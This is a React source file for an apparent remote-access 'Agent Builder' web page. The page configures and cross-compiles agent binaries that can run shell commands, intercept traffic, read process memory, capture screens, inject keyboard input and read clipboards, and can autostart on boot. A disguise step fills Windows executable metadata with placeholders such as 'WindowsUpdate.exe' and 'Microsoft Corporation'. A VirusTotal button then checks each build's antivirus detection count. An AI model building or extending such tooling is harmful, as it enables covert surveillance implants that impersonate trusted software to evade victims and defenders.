import { useState, useEffect, useRef } from 'react'
import { useSearchParams } from 'react-router-dom'
import { api } from '../api/client'
import type { BuildConfig, Profile } from '../api/types'
import { StatusBadge } from '../components/StatusBadge'

const ALL_CAPS = ['exec', 'filesystem', 'process', 'tunnel', 'mitm', 'debug', 'capture', 'input', 'clipboard']

const CAP_DESCRIPTIONS: Record<string, string> = {
  exec: 'Execute shell commands on the remote system',
  filesystem: 'Browse, read, write, and manage files on the remote system',
  process: 'List, start, and kill processes on the remote system',
  tunnel: 'Open TCP tunnels through the agent to reach internal services',
  mitm: 'Man-in-the-middle proxy for intercepting and analyzing network traffic',
  debug: 'Attach to processes, read memory, and inspect loaded modules',
  capture: 'Capture screenshots of the remote system display',
  input: 'Send keyboard and mouse input to the remote system',
  clipboard: 'Read and write the remote system clipboard',
}
const OS_OPTIONS = ['windows', 'linux', 'darwin', 'android']
const ARCH_OPTIONS = ['amd64', '386', 'arm64']
const PERMISSIONS = ['read-only', 'standard', 'sandboxed', 'full']

const wizardSteps = ['OS & Arch', 'Capabilities', 'Connection', 'Permissions', 'Disguise']

export default function Builder() {
  const [step, setStep] = useState(0)
  const [os, setOS] = useState('windows')
  const [arch, setArch] = useState('amd64')
  const [caps, setCaps] = useState<string[]>(['exec', 'filesystem'])
  const [serverURL, setServerURL] = useState('wss://localhost:7700/ws')
  const [token, setToken] = useState('')
  const [name, setName] = useState('')
  const [permissions, setPermissions] = useState('full')
  const [sandboxDir, setSandboxDir] = useState('')
  const [autostart, setAutostart] = useState(true)
  const [disguiseEnabled, setDisguiseEnabled] = useState(false)
  const [disguiseFilename, setDisguiseFilename] = useState('')
  const [disguiseCompany, setDisguiseCompany] = useState('')
  const [disguiseDescription, setDisguiseDescription] = useState('')
  const [disguiseProduct, setDisguiseProduct] = useState('')
  const [error, setError] = useState('')
  const [success, setSuccess] = useState('')
  const [buildId, setBuildId] = useState('')
  const [buildStatus, setBuildStatus] = useState('')
  const [builds, setBuilds] = useState<BuildConfig[]>([])
  const [vtScanning, setVTScanning] = useState<string | null>(null)
  const pollRef = useRef<ReturnType<typeof setInterval>>()

  // Presets (formerly the /profiles page): a saved Profile is a template for
  // the wizard fields below. The wizard never sends a profile id to the
  // builder — applying a preset copies its values into this form.
  const [presets, setPresets] = useState<Profile[]>([])
  const [presetId, setPresetId] = useState('')
  const [presetName, setPresetName] = useState('')
  const [presetMsg, setPresetMsg] = useState('')
  const [params] = useSearchParams()
  const presetsRequested = params.get('presets') === '1'

  useEffect(() => {
    loadBuilds()
    loadPresets()
    return () => { if (pollRef.current) clearInterval(pollRef.current) }
  }, [])

  const loadPresets = async () => {
    try {
      const p = await api.listProfiles()
      setPresets(p || [])
    } catch { /* profiles endpoint optional */ }
  }

  const loadBuilds = async () => {
    try {
      const b = await api.listBuilds()
      setBuilds(b || [])
    } catch { /* ignore */ }
  }

  const toggleCap = (cap: string) => {
    setCaps(prev => prev.includes(cap) ? prev.filter(c => c !== cap) : [...prev, cap])
  }

  const startBuild = async () => {
    setError('')
    setSuccess('')
    setBuildStatus('pending')
    try {
      const cfg: BuildConfig = {
        name: name || `agent-${os}-${arch}`,
        os, arch,
        capabilities: caps,
        server_url: serverURL,
        token: token || undefined as unknown as string,
        permissions,
        sandbox_dir: permissions === 'sandboxed' ? sandboxDir : '',
        autostart,
        disguise: disguiseEnabled ? {
          enabled: true,
          filename: disguiseFilename,
          company: disguiseCompany,
          description: disguiseDescription,
          product_name: disguiseProduct,
        } : undefined,
      }
      const build = await api.createBuild(cfg)
      setBuildId(build.id || '')
      setBuildStatus(build.status || 'pending')
      setSuccess(`Build started: ${build.id}`)
      pollBuild(build.id!)
    } catch (e) {
      setError((e as Error).message)
      setBuildStatus('failed')
    }
  }

  const pollBuild = (id: string) => {
    if (pollRef.current) clearInterval(pollRef.current)
    pollRef.current = setInterval(async () => {
      try {
        const b = await api.getBuild(id)
        setBuildStatus(b.status || '')
        if (b.status === 'complete' || b.status === 'failed') {
          if (pollRef.current) clearInterval(pollRef.current)
          loadBuilds()
        }
      } catch { /* ignore */ }
    }, 2000)
  }

  const downloadBuild = (id: string) => {
    window.open(api.downloadBuildUrl(id), '_blank')
  }

  // applyPreset copies a saved template into the wizard fields, so the next
  // "Build Agent" click uses it. Every field a Profile carries is restored.
  const applyPreset = (id: string) => {
    const p = presets.find(x => x.id === id)
    if (!p) return
    setOS(p.os || 'windows')
    setArch(p.arch || 'amd64')
    setCaps(p.capabilities || [])
    setServerURL(p.server_url || '')
    setPermissions(p.permissions || 'full')
    setSandboxDir(p.sandbox_dir || '')
    setAutostart(p.autostart)
    if (p.disguise?.enabled) {
      setDisguiseEnabled(true)
      setDisguiseFilename(p.disguise.filename || '')
      setDisguiseCompany(p.disguise.company || '')
      setDisguiseDescription(p.disguise.description || '')
      setDisguiseProduct(p.disguise.product_name || '')
    } else {
      setDisguiseEnabled(false)
    }
    setStep(0)
    setPresetMsg(`Applied preset "${p.name}" to the wizard.`)
  }

  const savePreset = async () => {
    const label = presetName.trim()
    if (!label) {
      setPresetMsg('Enter a preset name first.')
      return
    }
    try {
      await api.createProfile({
        name: label,
        os, arch,
        capabilities: caps,
        server_url: serverURL,
        permissions,
        sandbox_dir: permissions === 'sandboxed' ? sandboxDir : '',
        autostart,
        disguise: disguiseEnabled ? {
          enabled: true,
          filename: disguiseFilename,
          company: disguiseCompany,
          description: disguiseDescription,
          product_name: disguiseProduct,
        } : undefined,
      } as Profile)
      setPresetName('')
      setPresetMsg(`Saved preset "${label}".`)
      await loadPresets()
    } catch (e) {
      setPresetMsg(`Save failed: ${(e as Error).message}`)
    }
  }

  const removePreset = async (id: string) => {
    if (!id) return
    const p = presets.find(x => x.id === id)
    try {
      await api.deleteProfile(id)
      setPresetId('')
      setPresetMsg(`Deleted preset${p ? ` "${p.name}"` : ''}.`)
      await loadPresets()
    } catch (e) {
      setPresetMsg(`Delete failed: ${(e as Error).message}`)
    }
  }

  const removeBuild = async (id: string) => {
    try {
      await api.deleteBuild(id)
      loadBuilds()
    } catch (e) {
      setError((e as Error).message)
    }
  }

  const triggerVTScan = async (id: string) => {
    setVTScanning(id)
    try {
      await api.triggerVTScan(id)
      // Poll for VT scan result
      const vtPoll = setInterval(async () => {
        try {
          const res = await api.getVTScan(id)
          if (res.vt_status === 'clean' || res.vt_status === 'dirty') {
            clearInterval(vtPoll)
            setVTScanning(null)
            loadBuilds()
          }
        } catch {
          clearInterval(vtPoll)
          setVTScanning(null)
        }
      }, 5000)
    } catch (e) {
      setError((e as Error).message)
      setVTScanning(null)
    }
  }

  const vtBadge = (b: BuildConfig) => {
    if (vtScanning === b.id) return <span className="badge badge-yellow">scanning…</span>
    if (!b.vt_status) return <span className="badge badge-gray">not scanned</span>
    if (b.vt_status === 'clean') return <span className="badge badge-green">✓ clean ({b.vt_detections || 0}/0)</span>
    if (b.vt_status === 'dirty') return <span className="badge badge-red">⚠ dirty ({b.vt_detections || 0} detections)</span>
    if (b.vt_status === 'scanning') return <span className="badge badge-yellow">scanning…</span>
    if (b.vt_status === 'pending') return <span className="badge badge-yellow">pending</span>
    return <span className="badge badge-gray">{b.vt_status}</span>
  }

  return (
    <div>
      <div className="page-header">
        <h1>Agent Builder</h1>
        <p>Configure and cross-compile agent binaries with embedded configuration</p>
      </div>

      {error && <div className="error-msg">{error}</div>}
      {success && <div className="success-msg">{success}</div>}

      <div className="card">
        <div className={`preset-strip ${presetsRequested ? 'preset-strip-focus' : ''}`} id="preset-strip">
          <div className="card-title" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
            <span>Build presets</span>
            {presetsRequested && <span className="badge badge-blue">moved here from Profiles</span>}
          </div>
          <div className="flex gap-8" style={{ flexWrap: 'wrap', alignItems: 'flex-end' }}>
            <div className="form-group" style={{ minWidth: 240, marginBottom: 0 }}>
              <label htmlFor="preset-select">Preset</label>
              <select id="preset-select" value={presetId} onChange={e => setPresetId(e.target.value)}>
                <option value="">{presets.length ? 'Select a preset…' : 'No presets saved yet'}</option>
                {presets.map(p => (
                  <option key={p.id} value={p.id}>{p.name} — {p.os}/{p.arch} · {p.permissions}</option>
                ))}
              </select>
            </div>
            <button className="btn btn-sm" id="preset-apply" onClick={() => applyPreset(presetId)} disabled={!presetId}>Apply to wizard</button>
            <button className="btn btn-danger btn-sm" id="preset-delete" onClick={() => removePreset(presetId)} disabled={!presetId}>Delete preset</button>
            <div className="form-group" style={{ minWidth: 240, marginBottom: 0 }}>
              <label htmlFor="preset-name">Save current config as</label>
              <input id="preset-name" type="text" value={presetName} onChange={e => setPresetName(e.target.value)} placeholder="windows-full-agent" />
            </div>
            <button className="btn btn-primary btn-sm" id="preset-save" onClick={savePreset}>Save preset</button>
          </div>
          {presetMsg && <p className="dim mt-16" style={{ fontSize: 12 }} id="preset-msg">{presetMsg}</p>}
        </div>

        <div className="wizard-steps">
          {wizardSteps.map((s, i) => (
            <div key={s} className={`wizard-step ${i === step ? 'active' : ''} ${i < step ? 'done' : ''}`}>
              <span className="step-num">{i < step ? '✓' : i + 1}</span>
              {s}
            </div>
          ))}
        </div>

        {/* Step 0: OS & Arch */}
        {step === 0 && (
          <div>
            <div className="form-row">
              <div className="form-group">
                <label>Operating System</label>
                <select value={os} onChange={e => setOS(e.target.value)}>
                  {OS_OPTIONS.map(o => <option key={o} value={o}>{o}</option>)}
                </select>
              </div>
              <div className="form-group">
                <label>Architecture</label>
                <select value={arch} onChange={e => setArch(e.target.value)}>
                  {ARCH_OPTIONS.map(a => <option key={a} value={a}>{a}</option>)}
                </select>
              </div>
            </div>
            <div className="form-group">
              <label>Build Name</label>
              <input type="text" value={name} onChange={e => setName(e.target.value)} placeholder="agent-windows-amd64" />
            </div>
          </div>
        )}

        {/* Step 1: Capabilities */}
        {step === 1 && (
          <div>
            <div className="card-title">Select Capabilities</div>
            <div className="checkbox-group">
              {ALL_CAPS.map(cap => (
                <label key={cap} className={`checkbox-item ${caps.includes(cap) ? 'checked' : ''}`} title={CAP_DESCRIPTIONS[cap]}>
                  <input type="checkbox" checked={caps.includes(cap)} onChange={() => toggleCap(cap)} />
                  {cap}
                </label>
              ))}
            </div>
            <p className="dim mt-16">Selected: {caps.join(', ') || 'none'}</p>
          </div>
        )}

        {/* Step 2: Connection */}
        {step === 2 && (
          <div>
            <div className="form-group">
              <label>Server URL</label>
              <input type="text" value={serverURL} onChange={e => setServerURL(e.target.value)} placeholder="ws://host:port/ws" />
            </div>
            <div className="form-group">
              <label>Agent Token (required)</label>
              <input type="text" value={token} onChange={e => setToken(e.target.value)} placeholder="server token or enrollment token" />
            </div>
            <div className="form-group">
              <label>Auto-start on boot?</label>
              <label className="checkbox-item" style={{ display: 'inline-flex' }}>
                <input type="checkbox" checked={autostart} onChange={e => setAutostart(e.target.checked)} />
                Autostart
              </label>
            </div>
          </div>
        )}

        {/* Step 3: Permissions */}
        {step === 3 && (
          <div>
            <div className="form-group">
              <label>Permission Level</label>
              <select value={permissions} onChange={e => setPermissions(e.target.value)}>
                {PERMISSIONS.map(p => <option key={p} value={p}>{p}</option>)}
              </select>
            </div>
            {permissions === 'sandboxed' && (
              <div className="form-group">
                <label>Sandbox Directory</label>
                <input type="text" value={sandboxDir} onChange={e => setSandboxDir(e.target.value)} placeholder="C:\\sandbox" />
              </div>
            )}
          </div>
        )}

        {/* Step 4: Disguise */}
        {step === 4 && (
          <div>
            <div className="form-group">
              <label>
                <label className="checkbox-item" style={{ display: 'inline-flex' }}>
                  <input type="checkbox" checked={disguiseEnabled} onChange={e => setDisguiseEnabled(e.target.checked)} />
                  Enable PE Disguise (Windows only)
                </label>
              </label>
            </div>
            {disguiseEnabled && (
              <>
                <div className="form-group">
                  <label>Filename</label>
                  <input type="text" value={disguiseFilename} onChange={e => setDisguiseFilename(e.target.value)} placeholder="WindowsUpdate.exe" />
                </div>
                <div className="form-group">
                  <label>Company</label>
                  <input type="text" value={disguiseCompany} onChange={e => setDisguiseCompany(e.target.value)} placeholder="Microsoft Corporation" />
                </div>
                <div className="form-group">
                  <label>Description</label>
                  <input type="text" value={disguiseDescription} onChange={e => setDisguiseDescription(e.target.value)} placeholder="Windows Update Helper" />
                </div>
                <div className="form-group">
                  <label>Product Name</label>
                  <input type="text" value={disguiseProduct} onChange={e => setDisguiseProduct(e.target.value)} placeholder="Windows Update" />
                </div>
              </>
            )}
          </div>
        )}

        {/* Wizard nav */}
        <div className="wizard-nav">
          {step > 0 && (
            <button className="btn" onClick={() => setStep(s => Math.max(0, s - 1))}>← Previous</button>
          )}
          {step < wizardSteps.length - 1 ? (
            <button className="btn btn-primary" onClick={() => setStep(s => s + 1)}>Next →</button>
          ) : (
            <button className="btn btn-primary" onClick={startBuild} disabled={buildStatus === 'building' || buildStatus === 'pending'}>
              {buildStatus === 'building' || buildStatus === 'pending' ? 'Building…' : 'Build Agent'}
            </button>
          )}
        </div>

        {buildId && (
          <div className="mt-16">
            <div className="card-title">Build Status</div>
            <div className="flex gap-8" style={{ alignItems: 'center' }}>
              <span className="mono dim">ID: {buildId.slice(0, 16)}…</span>
              <StatusBadge status={buildStatus} />
              {buildStatus === 'complete' && (
                <button className="btn btn-primary btn-sm" onClick={() => downloadBuild(buildId)}>Download</button>
              )}
            </div>
          </div>
        )}
      </div>

      <div className="card">
        <div className="card-title">Build History</div>
        <div className="flex gap-8 mb-16">
          <button className="btn btn-sm" onClick={loadBuilds}>Refresh</button>
        </div>
        {builds.length === 0 ? (
          <div className="empty-state">No builds yet</div>
        ) : (
          <div className="table-container">
            <table>
              <thead>
                <tr><th>Name</th><th>OS/Arch</th><th>Status</th><th>VT Scan</th><th>Created</th><th>Actions</th></tr>
              </thead>
              <tbody>
                {builds.map(b => (
                  <tr key={b.id}>
                    <td>{b.name}</td>
                    <td className="mono">{b.os}/{b.arch}</td>
                    <td><StatusBadge status={b.status || 'pending'} /></td>
                    <td>
                      <div className="flex gap-8" style={{ alignItems: 'center' }}>
                        {vtBadge(b)}
                        {b.vt_report_url && (
                          <a href={b.vt_report_url} target="_blank" rel="noopener" className="dim" style={{ fontSize: 11 }}>report ↗</a>
                        )}
                      </div>
                    </td>
                    <td className="dim">{b.created_at ? new Date(b.created_at).toLocaleString() : '—'}</td>
                    <td>
                      <div className="flex gap-8">
                        {b.status === 'complete' && (
                          <button className="btn btn-sm" onClick={() => downloadBuild(b.id!)}>Download</button>
                        )}
                        {b.status === 'complete' && !b.vt_status && (
                          <button className="btn btn-sm" onClick={() => triggerVTScan(b.id!)} disabled={vtScanning === b.id}>
                            VT Scan
                          </button>
                        )}
                        <button className="btn btn-danger btn-sm" onClick={() => removeBuild(b.id!)}>Delete</button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  )
}